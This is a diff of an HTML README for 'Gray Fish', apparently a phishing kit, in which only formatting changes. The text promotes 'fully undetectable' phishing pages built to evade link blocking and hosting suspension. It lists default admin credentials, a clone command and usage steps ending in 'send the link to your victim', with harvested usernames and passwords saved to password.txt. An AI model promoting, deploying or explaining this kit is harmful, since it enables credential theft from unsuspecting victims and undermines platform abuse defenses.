@@ -1,22 +1,21 @@
 <h1> Gray Fish v2019.08</h1>
 <p>Gray Fish provides fully undetectable phishing pages. Are you bored of getting link blocked by facebook or other sites? Does your hosting provider suspend your account(e.g 000webhost)? Don't lose hope. Try Gray Fish. Hackers are 10 times more clever than simple programmers. But they don't tell you everything. <b>Before using it, make sure to read all article to avoid any problem.</b></p>
 <center><img src="https://i.ibb.co/PmH73X4/index.png" style="max-width:100%;align:middle;border:0;" alt="Gray Fish"></center>
-<h1>Gray Admin Login Panel</h1>
+<h1> Gray Admin Login Panel</h1>
 <ul><li>Username = <b>fish</b></li>
 <li>Password = <b>fish</b></li></ul>
 <h2> Usage</h2>
 <pre><code>
 git clone https://github.com/graysuit/grayfish.git
 </code></pre>
-<p><ol><li>Upload all files inside folder to any hosting you like</li>
+<br><p><ol><li>Upload all files inside folder to any hosting you like</li>
 <li>Enter your sitename and fill username & password(Default user & pass is <b>fish</b>)</li>
 <li>Select any phishing page and copy that link</li>
 <li>Shorten link if you want</li>
 <li>Send the link to your victim</li>
-<li><b>Note:</b> Username/Password will be saved as password.txt</li><ol></p>
+<li><b>Note:</b> Username/Password will be saved as password.txt</li><ol></p><br>
 <h2> Features</h2>
-<ul>
-<li>Fully undetectable (means Link will not get blocked + Hosting provider will not suspend your account).</li>
+<ul><li>Fully undetectable (means Link will not get blocked + Hosting provider will not suspend your account).</li>
 <li>All Templates are under 20KBs that helps in loading webpages fast.</li>
 <li>Images are encoded in base64 to avoid external + internal linking.</li>
 <li>Codes are highly compressed. Extra codes have been removed.</li>
